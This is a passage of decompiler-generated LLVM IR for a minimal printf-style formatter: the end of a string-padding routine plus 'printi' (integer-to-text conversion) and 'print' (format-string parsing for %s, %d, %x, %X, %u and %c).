  %stack_var_-44.0 = phi i32 [ 32, %entry ], [ 32, %dec_label_pc_87c4 ], [ 48, %dec_label_pc_87d4 ]
  %v1_87e0 = urem i32 %arg4, 2
  %v2_87e4 = icmp eq i32 %v1_87e0, 0
  br i1 %v2_87e4, label %dec_label_pc_8814.preheader, label %dec_label_pc_8850.preheader

dec_label_pc_8814.preheader:                      ; preds = %dec_label_pc_87dc
  %v5_881c16 = icmp sgt i32 %stack_var_-28.0, 0
  br i1 %v5_881c16, label %dec_label_pc_87f0.lr.ph, label %dec_label_pc_8850.preheader

dec_label_pc_87f0.lr.ph:                          ; preds = %dec_label_pc_8814.preheader
  %v2_87f8 = inttoptr i32 %arg1 to i32*
  br label %dec_label_pc_87f0

dec_label_pc_87f0:                                ; preds = %dec_label_pc_87f0.lr.ph, %dec_label_pc_87f0
  %stack_var_-28.117 = phi i32 [ %stack_var_-28.0, %dec_label_pc_87f0.lr.ph ], [ %v1_880c, %dec_label_pc_87f0 ]
  %v3_87f8 = call i32 @printchar(i32* %v2_87f8, i32 %stack_var_-44.0)
  %v3_87fc = load i32, i32* %stack_var_-48, align 4
  %v1_8800 = add i32 %v3_87fc, 1
  store i32 %v1_8800, i32* %stack_var_-48, align 4
  %v1_880c = add nsw i32 %stack_var_-28.117, -1
  %v5_881c = icmp sgt i32 %stack_var_-28.117, 1
  br i1 %v5_881c, label %dec_label_pc_87f0, label %dec_label_pc_8850.preheader

dec_label_pc_8850.preheader:                      ; preds = %dec_label_pc_87f0, %dec_label_pc_8814.preheader, %dec_label_pc_87dc
  %v3_889427 = phi i32 [ 0, %dec_label_pc_87dc ], [ 0, %dec_label_pc_8814.preheader ], [ %v1_8800, %dec_label_pc_87f0 ]
  %stack_var_-28.2.ph = phi i32 [ %stack_var_-28.0, %dec_label_pc_87dc ], [ %stack_var_-28.0, %dec_label_pc_8814.preheader ], [ 0, %dec_label_pc_87f0 ]
  %v2_88549 = load i8, i8* %arg2, align 1
  %v2_885811 = icmp eq i8 %v2_88549, 0
  br i1 %v2_885811, label %dec_label_pc_8888.preheader, label %dec_label_pc_8824.lr.ph

dec_label_pc_8824.lr.ph:                          ; preds = %dec_label_pc_8850.preheader
  %v2_8834 = inttoptr i32 %arg1 to i32*
  br label %dec_label_pc_8824

dec_label_pc_8824:                                ; preds = %dec_label_pc_8824.lr.ph, %dec_label_pc_8824
  %v4_885013 = phi i32 [ %tmp, %dec_label_pc_8824.lr.ph ], [ %v1_8848, %dec_label_pc_8824 ]
  %stack_var_-24.012 = phi i8* [ %arg2, %dec_label_pc_8824.lr.ph ], [ %v5_884c, %dec_label_pc_8824 ]
  %v2_8828 = load i8, i8* %stack_var_-24.012, align 1
  %v3_8828 = zext i8 %v2_8828 to i32
  %v3_8834 = call i32 @printchar(i32* %v2_8834, i32 %v3_8828)
  %v3_8838 = load i32, i32* %stack_var_-48, align 4
  %v1_883c = add i32 %v3_8838, 1
  store i32 %v1_883c, i32* %stack_var_-48, align 4
  %v1_8848 = add i32 %v4_885013, 1
  %v5_884c = inttoptr i32 %v1_8848 to i8*
  %v2_8854 = load i8, i8* %v5_884c, align 1
  %v2_8858 = icmp eq i8 %v2_8854, 0
  br i1 %v2_8858, label %dec_label_pc_8888.preheader, label %dec_label_pc_8824

dec_label_pc_8888.preheader:                      ; preds = %dec_label_pc_8824, %dec_label_pc_8850.preheader
  %v3_889426 = phi i32 [ %v3_889427, %dec_label_pc_8850.preheader ], [ %v1_883c, %dec_label_pc_8824 ]
  %v5_88906 = icmp sgt i32 %stack_var_-28.2.ph, 0
  br i1 %v5_88906, label %dec_label_pc_8864.lr.ph, label %dec_label_pc_8894

dec_label_pc_8864.lr.ph:                          ; preds = %dec_label_pc_8888.preheader
  %v2_886c = inttoptr i32 %arg1 to i32*
  br label %dec_label_pc_8864

dec_label_pc_8864:                                ; preds = %dec_label_pc_8864.lr.ph, %dec_label_pc_8864
  %stack_var_-28.37 = phi i32 [ %stack_var_-28.2.ph, %dec_label_pc_8864.lr.ph ], [ %v1_8880, %dec_label_pc_8864 ]
  %v3_886c = call i32 @printchar(i32* %v2_886c, i32 %stack_var_-44.0)
  %v3_8870 = load i32, i32* %stack_var_-48, align 4
  %v1_8874 = add i32 %v3_8870, 1
  store i32 %v1_8874, i32* %stack_var_-48, align 4
  %v1_8880 = add nsw i32 %stack_var_-28.37, -1
  %v5_8890 = icmp sgt i32 %stack_var_-28.37, 1
  br i1 %v5_8890, label %dec_label_pc_8864, label %dec_label_pc_8894

dec_label_pc_8894:                                ; preds = %dec_label_pc_8864, %dec_label_pc_8888.preheader
  %v3_8894 = phi i32 [ %v3_889426, %dec_label_pc_8888.preheader ], [ %v1_8874, %dec_label_pc_8864 ]
  store i32 %v3_8724, i32* @fp, align 4
  ret i32 %v3_8894

; uselistorder directives
  uselistorder i32 %v1_8848, { 1, 0 }
  uselistorder i32 %stack_var_-40.0.lcssa, { 1, 0 }
  uselistorder i32 %v1_8780, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32 %arg3, { 2, 0, 1, 3 }
  uselistorder i8* %arg2, { 1, 2, 0, 3 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8864, { 1, 0 }
  uselistorder label %dec_label_pc_8824, { 1, 0 }
  uselistorder label %dec_label_pc_87f0, { 1, 0 }
  uselistorder label %dec_label_pc_87dc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_87c4, { 1, 0 }
  uselistorder label %dec_label_pc_8770, { 1, 0 }
}

define i32 @printi(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %stack_var_-17 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  %v3_88ac = load i32, i32* @fp, align 4
  store i32 34996, i32* %stack_var_-4, align 4
  %v2_88b0 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_88b0, i32* @fp, align 4
  %v1_88e4 = icmp slt i32 %arg2, 0
  %v2_88e4 = icmp eq i32 %arg2, 0
  br i1 %v2_88e4, label %dec_label_pc_88ec, label %dec_label_pc_8920

dec_label_pc_88ec:                                ; preds = %entry
  store i32 48, i32* %stack_var_-28, align 4
  %v5_8910 = bitcast i32* %stack_var_-28 to i8*
  %v6_8910 = call i32 @prints(i32 %arg1, i8* %v5_8910, i32 %arg5, i32 %arg6, i32 0)
  br label %dec_label_pc_8a80

dec_label_pc_8920:                                ; preds = %entry
  %v2_8924 = icmp eq i32 %arg4, 0
  br i1 %v2_8924, label %dec_label_pc_8958, label %dec_label_pc_892c

dec_label_pc_892c:                                ; preds = %dec_label_pc_8920
  %v7_8930 = icmp eq i32 %arg3, 10
  br i1 %v7_8930, label %dec_label_pc_8938, label %dec_label_pc_8958

dec_label_pc_8938:                                ; preds = %dec_label_pc_892c
  br i1 %v1_88e4, label %dec_label_pc_8944, label %dec_label_pc_8958

dec_label_pc_8944:                                ; preds = %dec_label_pc_8938
  %v1_8950 = sub i32 0, %arg2
  br label %dec_label_pc_8958

dec_label_pc_8958:                                ; preds = %dec_label_pc_8938, %dec_label_pc_892c, %dec_label_pc_8920, %dec_label_pc_8944
  %stack_var_-52.0 = phi i32 [ %arg2, %dec_label_pc_8920 ], [ %v1_8950, %dec_label_pc_8944 ], [ %arg2, %dec_label_pc_8938 ], [ %arg2, %dec_label_pc_892c ]
  %stack_var_-60.0 = phi i32 [ 0, %dec_label_pc_8920 ], [ 1, %dec_label_pc_8944 ], [ 0, %dec_label_pc_8938 ], [ 0, %dec_label_pc_892c ]
  %tmp26 = bitcast i32* %stack_var_-17 to i8*
  store i8 0, i8* %tmp26, align 4
  %v2_89ec4 = icmp eq i32 %stack_var_-52.0, 0
  br i1 %v2_89ec4, label %dec_label_pc_89f4, label %dec_label_pc_8974.lr.ph

dec_label_pc_8974.lr.ph:                          ; preds = %dec_label_pc_8958
  %v1_899c = add i32 %arg7, -58
  br label %dec_label_pc_8974

dec_label_pc_8974:                                ; preds = %dec_label_pc_8974.lr.ph, %dec_label_pc_89ac
  %stack_var_-52.16 = phi i32 [ %stack_var_-52.0, %dec_label_pc_8974.lr.ph ], [ %v2_8980, %dec_label_pc_89ac ]
  %stack_var_-68.05 = phi i8* [ %tmp26, %dec_label_pc_8974.lr.ph ], [ %v5_89b4, %dec_label_pc_89ac ]
  %v2_8980 = udiv i32 %stack_var_-52.16, %arg3
  %v3_8980 = urem i32 %stack_var_-52.16, %arg3
  %v7_8994 = icmp slt i32 %v3_8980, 10
  br i1 %v7_8994, label %dec_label_pc_89ac, label %dec_label_pc_8998

dec_label_pc_8998:                                ; preds = %dec_label_pc_8974
  %v2_89a4 = add i32 %v3_8980, %v1_899c
  br label %dec_label_pc_89ac

dec_label_pc_89ac:                                ; preds = %dec_label_pc_8974, %dec_label_pc_8998
  %stack_var_-64.0 = phi i32 [ %v3_8980, %dec_label_pc_8974 ], [ %v2_89a4, %dec_label_pc_8998 ]
  %v4_89ac = ptrtoint i8* %stack_var_-68.05 to i32
  %v1_89b0 = add i32 %v4_89ac, -1
  %v5_89b4 = inttoptr i32 %v1_89b0 to i8*
  %fold = add i32 %stack_var_-64.0, 48
  %v1_89cc = trunc i32 %fold to i8
  store i8 %v1_89cc, i8* %v5_89b4, align 1
  %v2_89ec = icmp ult i32 %stack_var_-52.16, %arg3
  br i1 %v2_89ec, label %dec_label_pc_89f4, label %dec_label_pc_8974

dec_label_pc_89f4:                                ; preds = %dec_label_pc_89ac, %dec_label_pc_8958
  %stack_var_-68.0.lcssa = phi i8* [ %tmp26, %dec_label_pc_8958 ], [ %v5_89b4, %dec_label_pc_89ac ]
  %v2_89f8 = icmp eq i32 %stack_var_-60.0, 0
  br i1 %v2_89f8, label %dec_label_pc_8a5c, label %dec_label_pc_8a00

dec_label_pc_8a00:                                ; preds = %dec_label_pc_89f4
  %v3_8a00 = load i32, i32* %stack_var_0, align 4
  %v2_8a04 = icmp eq i32 %v3_8a00, 0
  br i1 %v2_8a04, label %dec_label_pc_8a44, label %dec_label_pc_8a0c

dec_label_pc_8a0c:                                ; preds = %dec_label_pc_8a00
  %v1_8a10 = and i32 %arg6, 2
  %v2_8a14 = icmp eq i32 %v1_8a10, 0
  br i1 %v2_8a14, label %dec_label_pc_8a44, label %dec_label_pc_8a1c

dec_label_pc_8a1c:                                ; preds = %dec_label_pc_8a0c
  %v2_8a24 = inttoptr i32 %arg1 to i32*
  %v3_8a24 = call i32 @printchar(i32* %v2_8a24, i32 45)
  %v3_8a34 = load i32, i32* %stack_var_0, align 4
  %v1_8a38 = add i32 %v3_8a34, -1
  store i32 %v1_8a38, i32* %stack_var_0, align 4
  br label %dec_label_pc_8a5c

dec_label_pc_8a44:                                ; preds = %dec_label_pc_8a0c, %dec_label_pc_8a00
  %v4_8a44 = ptrtoint i8* %stack_var_-68.0.lcssa to i32
  %v1_8a48 = add i32 %v4_8a44, -1
  %v5_8a4c = inttoptr i32 %v1_8a48 to i8*
  store i8 45, i8* %v5_8a4c, align 1
  br label %dec_label_pc_8a5c

dec_label_pc_8a5c:                                ; preds = %dec_label_pc_89f4, %dec_label_pc_8a1c, %dec_label_pc_8a44
  %stack_var_-68.1 = phi i8* [ %stack_var_-68.0.lcssa, %dec_label_pc_89f4 ], [ %v5_8a4c, %dec_label_pc_8a44 ], [ %stack_var_-68.0.lcssa, %dec_label_pc_8a1c ]
  %stack_var_-56.0 = phi i32 [ 0, %dec_label_pc_89f4 ], [ 0, %dec_label_pc_8a44 ], [ 1, %dec_label_pc_8a1c ]
  %v3_8a64 = load i32, i32* %stack_var_0, align 4
  %v6_8a6c = call i32 @prints(i32 %arg1, i8* %stack_var_-68.1, i32 %v3_8a64, i32 %arg6, i32 ptrtoint (i32* @0 to i32))
  %v2_8a78 = add i32 %v6_8a6c, %stack_var_-56.0
  br label %dec_label_pc_8a80

dec_label_pc_8a80:                                ; preds = %dec_label_pc_88ec, %dec_label_pc_8a5c
  %storemerge2 = phi i32 [ %v2_8a78, %dec_label_pc_8a5c ], [ %v6_8910, %dec_label_pc_88ec ]
  store i32 %v3_88ac, i32* @fp, align 4
  ret i32 %storemerge2

; uselistorder directives
  uselistorder i8* %stack_var_-68.0.lcssa, { 2, 0, 1 }
  uselistorder i8* %v5_89b4, { 0, 2, 1 }
  uselistorder i32 %v3_8980, { 1, 0, 2 }
  uselistorder i32 %stack_var_-52.16, { 0, 2, 1 }
  uselistorder i32* %stack_var_0, { 1, 2, 3, 4, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg6, { 2, 1, 0 }
  uselistorder i32 %arg3, { 0, 2, 3, 1 }
  uselistorder i32 %arg2, { 0, 1, 3, 2, 5, 4 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8a80, { 1, 0 }
  uselistorder label %dec_label_pc_8a5c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_89ac, { 1, 0 }
  uselistorder label %dec_label_pc_8974, { 1, 0 }
  uselistorder label %dec_label_pc_8958, { 3, 0, 1, 2 }
}

define i32 @print(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8, i32 %arg9, i32 %arg10, i32 %arg11, i32 %arg12, i32 %arg13) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-18 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  store i32 35488, i32* %stack_var_-4, align 4
  %v2_8a9c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_8a9c, i32* @fp, align 4
  %stack_var_-32.428 = inttoptr i32 %arg2 to i8*
  %v2_8e4829 = load i8, i8* %stack_var_-32.428, align 1
  %v2_8e4c31 = icmp eq i8 %v2_8e4829, 0
  br i1 %v2_8e4c31, label %dec_label_pc_8e54, label %dec_label_pc_8abc.lr.ph

dec_label_pc_8abc.lr.ph:                          ; preds = %entry
  %v5_8e00 = bitcast i32* %stack_var_-18 to i8*
  br label %dec_label_pc_8abc

dec_label_pc_8abc:                                ; preds = %dec_label_pc_8abc.lr.ph, %dec_label_pc_8e38
  %stack_var_-32.435 = phi i8* [ %stack_var_-32.428, %dec_label_pc_8abc.lr.ph ], [ %stack_var_-32.4, %dec_label_pc_8e38 ]
  %stack_var_-32.4.in34 = phi i32 [ %arg2, %dec_label_pc_8abc.lr.ph ], [ %v1_8e3c, %dec_label_pc_8e38 ]
  %stack_var_-36.133 = phi i32 [ %arg3, %dec_label_pc_8abc.lr.ph ], [ %stack_var_-36.0, %dec_label_pc_8e38 ]
  %stack_var_-44.132 = phi i32 [ 0, %dec_label_pc_8abc.lr.ph ], [ %stack_var_-44.0, %dec_label_pc_8e38 ]
  %v2_8ac0 = load i8, i8* %stack_var_-32.435, align 1
  %v7_8ac4 = icmp eq i8 %v2_8ac0, 37
  br i1 %v7_8ac4, label %dec_label_pc_8acc, label %dec_label_pc_8e18

dec_label_pc_8acc:                                ; preds = %dec_label_pc_8abc
  %v1_8ad0 = add i32 %stack_var_-32.4.in34, 1
  %v5_8ad4 = inttoptr i32 %v1_8ad0 to i8*
  %v2_8aec = load i8, i8* %v5_8ad4, align 1
  %v2_8af0 = icmp eq i8 %v2_8aec, 0
  br i1 %v2_8af0, label %dec_label_pc_8e54, label %dec_label_pc_8af8

dec_label_pc_8af8:                                ; preds = %dec_label_pc_8acc
  %v2_8afc = load i8, i8* %v5_8ad4, align 1
  %v7_8b00 = icmp eq i8 %v2_8afc, 37
  br i1 %v7_8b00, label %dec_label_pc_8e18, label %dec_label_pc_8b08

dec_label_pc_8b08:                                ; preds = %dec_label_pc_8af8
  %v2_8b0c = load i8, i8* %v5_8ad4, align 1
  %v7_8b10 = icmp eq i8 %v2_8b0c, 45
  br i1 %v7_8b10, label %dec_label_pc_8b18, label %dec_label_pc_8b48.preheader

dec_label_pc_8b18:                                ; preds = %dec_label_pc_8b08
  %v1_8b1c = add i32 %stack_var_-32.4.in34, 2
  %v5_8b20 = inttoptr i32 %v1_8b1c to i8*
  br label %dec_label_pc_8b48.preheader

dec_label_pc_8b48.preheader:                      ; preds = %dec_label_pc_8b18, %dec_label_pc_8b08
  %stack_var_-32.0.ph = phi i8* [ %v5_8ad4, %dec_label_pc_8b08 ], [ %v5_8b20, %dec_label_pc_8b18 ]
  %stack_var_-48.0.ph = phi i32 [ 0, %dec_label_pc_8b08 ], [ 1, %dec_label_pc_8b18 ]
  %v4_8b482 = ptrtoint i8* %stack_var_-32.0.ph to i32
  %v2_8b4c3 = load i8, i8* %stack_var_-32.0.ph, align 1
  %v7_8b507 = icmp eq i8 %v2_8b4c3, 48
  br i1 %v7_8b507, label %dec_label_pc_8b30, label %dec_label_pc_8b94.preheader

dec_label_pc_8b30:                                ; preds = %dec_label_pc_8b48.preheader, %dec_label_pc_8b30
  %v4_8b489 = phi i32 [ %v1_8b34, %dec_label_pc_8b30 ], [ %v4_8b482, %dec_label_pc_8b48.preheader ]
  %stack_var_-48.08 = phi i32 [ %v1_8b40, %dec_label_pc_8b30 ], [ %stack_var_-48.0.ph, %dec_label_pc_8b48.preheader ]
  %v1_8b34 = add i32 %v4_8b489, 1
  %v5_8b38 = inttoptr i32 %v1_8b34 to i8*
  %v1_8b40 = or i32 %stack_var_-48.08, 2
  %v2_8b4c = load i8, i8* %v5_8b38, align 1
  %v7_8b50 = icmp eq i8 %v2_8b4c, 48
  br i1 %v7_8b50, label %dec_label_pc_8b30, label %dec_label_pc_8b94.preheader

dec_label_pc_8b94.preheader:                      ; preds = %dec_label_pc_8b30, %dec_label_pc_8b48.preheader
  %stack_var_-48.0.lcssa = phi i32 [ %stack_var_-48.0.ph, %dec_label_pc_8b48.preheader ], [ %v1_8b40, %dec_label_pc_8b30 ]
  %stack_var_-32.0.lcssa = phi i8* [ %stack_var_-32.0.ph, %dec_label_pc_8b48.preheader ], [ %v5_8b38, %dec_label_pc_8b30 ]
  %v4_8b9411 = ptrtoint i8* %stack_var_-32.0.lcssa to i32
  %v2_8b9812 = load i8, i8* %stack_var_-32.0.lcssa, align 1
  %tmp60 = icmp ult i8 %v2_8b9812, 48
  br i1 %tmp60, label %dec_label_pc_8bb4, label %dec_label_pc_8ba4

dec_label_pc_8b5c:                                ; preds = %dec_label_pc_8ba4
  %v2_8b68 = mul i32 %stack_var_-52.019, 10
  %v2_8b74 = load i8, i8* %stack_var_-32.120, align 1
  %v3_8b74 = zext i8 %v2_8b74 to i32
  %v1_8b78 = add i32 %v2_8b68, -48
  %v2_8b80 = add i32 %v1_8b78, %v3_8b74
  %v1_8b8c = add i32 %v4_8b9421, 1
  %v5_8b90 = inttoptr i32 %v1_8b8c to i8*
  %v2_8b98 = load i8, i8* %v5_8b90, align 1
  %tmp61 = icmp ult i8 %v2_8b98, 48
  br i1 %tmp61, label %dec_label_pc_8bb4, label %dec_label_pc_8ba4

dec_label_pc_8ba4:                                ; preds = %dec_label_pc_8b94.preheader, %dec_label_pc_8b5c
  %v4_8b9421 = phi i32 [ %v1_8b8c, %dec_label_pc_8b5c ], [ %v4_8b9411, %dec_label_pc_8b94.preheader ]
  %stack_var_-32.120 = phi i8* [ %v5_8b90, %dec_label_pc_8b5c ], [ %stack_var_-32.0.lcssa, %dec_label_pc_8b94.preheader ]
  %stack_var_-52.019 = phi i32 [ %v2_8b80, %dec_label_pc_8b5c ], [ 0, %dec_label_pc_8b94.preheader ]
  %v2_8ba8 = load i8, i8* %stack_var_-32.120, align 1
  %tmp62 = icmp ult i8 %v2_8ba8, 58
  br i1 %tmp62, label %dec_label_pc_8b5c, label %dec_label_pc_8bb4

dec_label_pc_8bb4:                                ; preds = %dec_label_pc_8b5c, %dec_label_pc_8ba4, %dec_label_pc_8b94.preheader
  %stack_var_-52.0.lcssa = phi i32 [ 0, %dec_label_pc_8b94.preheader ], [ %v2_8b80, %dec_label_pc_8b5c ], [ %stack_var_-52.019, %dec_label_pc_8ba4 ]
  %stack_var_-32.1.lcssa = phi i8* [ %stack_var_-32.0.lcssa, %dec_label_pc_8b94.preheader ], [ %v5_8b90, %dec_label_pc_8b5c ], [ %stack_var_-32.120, %dec_label_pc_8ba4 ]
  %v2_8bb8 = load i8, i8* %stack_var_-32.1.lcssa, align 1
  %v7_8bbc = icmp eq i8 %v2_8bb8, 115
  br i1 %v7_8bbc, label %dec_label_pc_8bc4, label %dec_label_pc_8c28

dec_label_pc_8bc4:                                ; preds = %dec_label_pc_8bb4
  %v1_8bc8 = add i32 %stack_var_-36.133, 4
  %v1_8bd4 = inttoptr i32 %stack_var_-36.133 to i32*
  %v2_8bd4 = load i32, i32* %v1_8bd4, align 4
  %v2_8be0 = icmp eq i32 %v2_8bd4, 0
  br i1 %v2_8be0, label %dec_label_pc_8bf4, label %dec_label_pc_8be8

dec_label_pc_8be8:                                ; preds = %dec_label_pc_8bc4
  %v5_8bec = inttoptr i32 %v2_8bd4 to i8*
  br label %dec_label_pc_8bfc

dec_label_pc_8bf4:                                ; preds = %dec_label_pc_8bc4
  br label %dec_label_pc_8bfc

dec_label_pc_8bfc:                                ; preds = %dec_label_pc_8be8, %dec_label_pc_8bf4
  %storemerge = phi i8* [ getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_15790.35, i32 0, i32 0), %dec_label_pc_8bf4 ], [ %v5_8bec, %dec_label_pc_8be8 ]
  %v7_8c10 = call i32 @prints(i32 %tmp, i8* %storemerge, i32 %stack_var_-52.0.lcssa, i32 %stack_var_-48.0.lcssa, i32 ptrtoint (i32* @0 to i32))
  %v2_8c1c = add i32 %v7_8c10, %stack_var_-44.132
  br label %dec_label_pc_8e38

dec_label_pc_8c28:                                ; preds = %dec_label_pc_8bb4
  %v2_8c2c = load i8, i8* %stack_var_-32.1.lcssa, align 1
  %v7_8c30 = icmp eq i8 %v2_8c2c, 100
  br i1 %v7_8c30, label %dec_label_pc_8c38, label %dec_label_pc_8c8c

dec_label_pc_8c38:                                ; preds = %dec_label_pc_8c28
  %v1_8c3c = add i32 %stack_var_-36.133, 4
  %v1_8c48 = inttoptr i32 %stack_var_-36.133 to i32*
  %v2_8c48 = load i32, i32* %v1_8c48, align 4
  %v7_8c74 = call i32 @printi(i32 %tmp, i32 %v2_8c48, i32 10, i32 1, i32 %stack_var_-52.0.lcssa, i32 %stack_var_-48.0.lcssa, i32 97)
  %v2_8c80 = add i32 %v7_8c74, %stack_var_-44.132
  br label %dec_label_pc_8e38

dec_label_pc_8c8c:                                ; preds = %dec_label_pc_8c28
  %v2_8c90 = load i8, i8* %stack_var_-32.1.lcssa, align 1
  %v7_8c94 = icmp eq i8 %v2_8c90, 120
  br i1 %v7_8c94, label %dec_label_pc_8c9c, label %dec_label_pc_8cf0

dec_label_pc_8c9c:                                ; preds = %dec_label_pc_8c8c
  %v1_8ca0 = add i32 %stack_var_-36.133, 4
  %v1_8cac = inttoptr i32 %stack_var_-36.133 to i32*
  %v2_8cac = load i32, i32* %v1_8cac, align 4
  %v7_8cd8 = call i32 @printi(i32 %tmp, i32 %v2_8cac, i32 16, i32 0, i32 %stack_var_-52.0.lcssa, i32 %stack_var_-48.0.lcssa, i32 97)
  %v2_8ce4 = add i32 %v7_8cd8, %stack_var_-44.132
  br label %dec_label_pc_8e38

dec_label_pc_8cf0:                                ; preds = %dec_label_pc_8c8c
  %v2_8cf4 = load i8, i8* %stack_var_-32.1.lcssa, align 1
  %v7_8cf8 = icmp eq i8 %v2_8cf4, 88
  br i1 %v7_8cf8, label %dec_label_pc_8d00, label %dec_label_pc_8d54

dec_label_pc_8d00:                                ; preds = %dec_label_pc_8cf0
  %v1_8d04 = add i32 %stack_var_-36.133, 4
  %v1_8d10 = inttoptr i32 %stack_var_-36.133 to i32*
  %v2_8d10 = load i32, i32* %v1_8d10, align 4
  %v7_8d3c = call i32 @printi(i32 %tmp, i32 %v2_8d10, i32 16, i32 0, i32 %stack_var_-52.0.lcssa, i32 %stack_var_-48.0.lcssa, i32 65)
  %v2_8d48 = add i32 %v7_8d3c, %stack_var_-44.132
  br label %dec_label_pc_8e38

dec_label_pc_8d54:                                ; preds = %dec_label_pc_8cf0
  %v2_8d58 = load i8, i8* %stack_var_-32.1.lcssa, align 1
  %v7_8d5c = icmp eq i8 %v2_8d58, 117
  br i1 %v7_8d5c, label %dec_label_pc_8d64, label %dec_label_pc_8db8

dec_label_pc_8d64:                                ; preds = %dec_label_pc_8d54
  %v1_8d68 = add i32 %stack_var_-36.133, 4
  %v1_8d74 = inttoptr i32 %stack_var_-36.133 to i32*
  %v2_8d74 = load i32, i32* %v1_8d74, align 4
  %v7_8da0 = call i32 @printi(i32 %tmp, i32 %v2_8d74, i32 10, i32 0, i32 %stack_var_-52.0.lcssa, i32 %stack_var_-48.0.lcssa, i32 97)
  %v2_8dac = add i32 %v7_8da0, %stack_var_-44.132
  br label %dec_label_pc_8e38

dec_label_pc_8db8:                                ; preds = %dec_label_pc_8d54
  %v2_8dbc = load i8, i8* %stack_var_-32.1.lcssa, align 1
  %v7_8dc0 = icmp eq i8 %v2_8dbc, 99
  br i1 %v7_8dc0, label %dec_label_pc_8dc8, label %dec_label_pc_8e38

dec_label_pc_8dc8:                                ; preds = %dec_label_pc_8db8
  %v1_8dcc = add i32 %stack_var_-36.133, 4
  %v1_8dd8 = inttoptr i32 %stack_var_-36.133 to i32*
  %v2_8dd8 = load i32, i32* %v1_8dd8, align 4
  %v1_8ddc = urem i32 %v2_8dd8, 256
  store i32 %v1_8ddc, i32* %stack_var_-18, align 4
  %v6_8e00 = call i32 @prints(i32 %tmp, i8* %v5_8e00, i32 %stack_var_-52.0.lcssa, i32 %stack_var_-48.0.lcssa, i32 %v1_8dcc)
  %v2_8e0c = add i32 %v6_8e00, %stack_var_-44.132
  br label %dec_label_pc_8e38

dec_label_pc_8e18:                                ; preds = %dec_label_pc_8abc, %dec_label_pc_8af8
  %stack_var_-32.2 = phi i8* [ %v5_8ad4, %dec_label_pc_8af8 ], [ %stack_var_-32.435, %dec_label_pc_8abc ]
  %v2_8e1c = load i8, i8* %stack_var_-32.2, align 1
  %v3_8e1c = zext i8 %v2_8e1c to i32
  %v3_8e28 = call i32 @printchar(i32* %arg1, i32 %v3_8e1c)
  %v1_8e30 = add i32 %stack_var_-44.132, 1
  br label %dec_label_pc_8e38

dec_label_pc_8e38:                                ; preds = %dec_label_pc_8db8, %dec_label_pc_8dc8, %dec_label_pc_8d64, %dec_label_pc_8d00, %dec_label_pc_8c9c, %dec_label_pc_8c38, %dec_label_pc_8bfc, %dec_label_pc_8e18
  %stack_var_-44.0 = phi i32 [ %v1_8e30, %dec_label_pc_8e18 ], [ %v2_8c1c, %dec_label_pc_8bfc ], [ %v2_8c80, %dec_label_pc_8c38 ], [ %v2_8ce4, %dec_label_pc_8c9c ], [ %v2_8d48, %dec_label_pc_8d00 ], [ %v2_8dac, %dec_label_pc_8d64 ], [ %v2_8e0c, %dec_label_pc_8dc8 ], [ %stack_var_-44.132, %dec_label_pc_8db8 ]
  %stack_var_-36.0 = phi i32 [ %stack_var_-36.133, %dec_label_pc_8e18 ], [ %v1_8bc8, %dec_label_pc_8bfc ], [ %v1_8c3c, %dec_label_pc_8c38 ], [ %v1_8ca0, %dec_label_pc_8c9c ], [ %v1_8d04, %dec_label_pc_8d00 ], [ %v1_8d68, %dec_label_pc_8d64 ], [ %v1_8dcc, %dec_label_pc_8dc8 ], [ %stack_var_-36.133, %dec_label_pc_8db8 ]
  %stack_var_-32.3 = phi i8* [ %stack_var_-32.2, %dec_label_pc_8e18 ], [ %stack_var_-32.1.lcssa, %dec_label_pc_8bfc ], [ %stack_var_-32.1.lcssa, %dec_label_pc_8c38 ], [ %stack_var_-32.1.lcssa, %dec_label_pc_8c9c ], [ %stack_var_-32.1.lcssa, %dec_label_pc_8d00 ], [ %stack_var_-32.1.lcssa, %dec_label_pc_8d64 ], [ %stack_var_-32.1.lcssa, %dec_label_pc_8dc8 ], [ %stack_var_-32.1.lcssa, %dec_label_pc_8db8 ]
  %v4_8e38 = ptrtoint i8* %stack_var_-32.3 to i32
  %v1_8e3c = add i32 %v4_8e38, 1
  %stack_var_-32.4 = inttoptr i32 %v1_8e3c to i8*
  %v2_8e48 = load i8, i8* %stack_var_-32.4, align 1
  %v2_8e4c = icmp eq i8 %v2_8e48, 0
  br i1 %v2_8e4c, label %dec_label_pc_8e54, label %dec_label_pc_8abc

dec_label_pc_8e54:                                ; preds = %dec_label_pc_8acc, %dec_label_pc_8e38, %entry
  %stack_var_-44.1.lcssa = phi i32 [ 0, %entry ], [ %stack_var_-44.132, %dec_label_pc_8acc ], [ %stack_var_-44.0, %dec_label_pc_8e38 ]
  %v2_8e58 = icmp eq i32* %arg1, null
  br i1 %v2_8e58, label %dec_label_pc_8e70, label %dec_label_pc_8e60

dec_label_pc_8e60:                                ; preds = %dec_label_pc_8e54
  %v2_8e64 = load i32, i32* %arg1, align 4
  %v3_8e6c = inttoptr i32 %v2_8e64 to i8*
  store i8 0, i8* %v3_8e6c, align 1
  br label %dec_label_pc_8e70

dec_label_pc_8e70:                                ; preds = %dec_label_pc_8e54, %dec_label_pc_8e60
  ret i32 %stack_var_-44.1.lcssa

; uselistorder directives
  uselistorder i8* %stack_var_-32.4, { 1, 0 }
  uselistorder i8* %stack_var_-32.1.lcssa, { 12, 11, 9, 7, 5, 3, 1, 10, 8, 6, 4, 2, 0 }
  uselistorder i32 %stack_var_-52.0.lcssa, { 1, 2, 3, 4, 5, 0 }
